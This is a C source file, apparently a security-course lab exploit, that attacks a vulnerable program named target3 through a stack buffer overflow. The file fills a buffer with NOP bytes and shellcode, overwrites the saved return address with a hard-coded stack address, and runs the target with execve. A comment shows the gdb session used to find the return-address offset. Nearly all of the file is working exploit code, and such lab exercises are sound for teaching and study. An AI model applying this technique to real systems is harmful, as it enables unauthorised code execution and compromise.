#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
/*
(gdb) info frame
	Stack level 0, frame at 0x3021fea0:
 	rip = 0x400c3a in foo (target3.c:24); saved rip = 0x400cd2
 	called by frame at 0x3021fed0
 	source language c.
 	Arglist at 0x3021fe90, args: arg=0x7fffffffd7b2 "test"
 	Locals at 0x3021fe90, Previous frame's sp is 0x3021fea0
 	Saved registers:
  	rbp at 0x3021fe90, rip at 0x3021fe98
(gdb) p &buf
	$1 = (char (*)[64]) 0x3021fe50

p &targ
	$1 = (char **) 0x3021fe10
(gdb) x 0x3021fe10
	0x3021fe10:     0x3021fe50

return address is in 0x3021fe90, buf is in 0x3021fe50
the distance between buf & rip : 0x3021fe98 - 0x3021fe50 = 72 bytes

since in foo, the program write 'AAAA' in buf, so we need write the start of buf in buf[68]
*/
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buf[128];
	for(int i = 0 ; i < 128; i++){
		buf[i] = 0x90;
	}
	//fill buf with shellcode
	for(int i = 0; i < 45; i++){
		buf[i] = shellcode[i];
	}

	buf[68] = '\x54';
	buf[69] = '\xfe';
	buf[70] = '\x21';
	buf[71] = '\x30';
	buf[72] = '\x00';

	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
